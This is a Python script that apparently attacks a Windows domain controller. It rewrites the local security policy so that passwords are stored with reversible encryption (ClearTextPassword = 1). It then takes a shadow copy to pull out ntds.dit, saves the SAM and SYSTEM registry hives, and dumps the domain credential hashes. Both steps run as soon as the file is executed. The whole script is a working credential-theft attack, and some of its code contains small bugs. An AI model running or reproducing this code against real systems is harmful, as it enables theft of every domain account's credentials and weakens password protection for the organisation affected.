import subprocess
from framework import readNTDS
from framework.readNTDS import NTDSHashes
from framework import samdumpy2

def disableEncryption():
    proc = subprocess.run(["powershell", "-command", r"secedit /export /cfg C:\secpol.cfg"], capture_output=True)
    print(proc.stdout.decode())
    encryptionLineIndex = 11 #default(?) location
    try:
        with open(r"C:\secpol.cfg", "r") as file:
            content = file.readlines()
            for line in content:
                if line.startswith("ClearTextPassword"):
                    print("Found encryption line at: " + str(content.index(line)))
                    encryptionlineIndex =  content.index(line) 
            file.close()
        with open(r"C:\secpol.cfg", "w") as file:
            content[encryptionLineIndex] = "ClearTextPassword = 1\n"
            file.writelines(content)
            print("Replaced encryption line, reloading...")

    except FileNotFoundError:
        print("Config not found, possible error in powershell")

    proc = subprocess.run(["powershell", "-command", r"secedit /configure /db secedit.db /cfg C:\secpol.cfg /areas SECURITYPOLICY"], capture_output=True)
    print(proc.stdout.decode())

def passwordsteal():
    proc = subprocess.getoutput("vssadmin create shadow /for=C:")
    proc = proc.split(":")
    subprocess.run("copy " + proc[3] + "\\Windows\\Ntds\\ntds.dit C:\\Windows\\Temp")
    subprocess.run("vssadmin delete shadows /shadow=" + proc[2].split(" ")[1])
    subprocess.run("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM")
    subprocess.run("reg save HKLM\\SAM C:\\Windows\\Temp\\SAM")
    ntdsfile = open("\\Windows\\Temp\\ntds.dit")
    bootkey = samdumpy2.getsyskey("C:\\Windows\\Temp\\SAM C:\\Windows\\Temp\\SYSTEM")
    secretdata = NTDSHashes(ntdsfile, bootkey)
    secretdata.dump()



disableEncryption()
passwordsteal()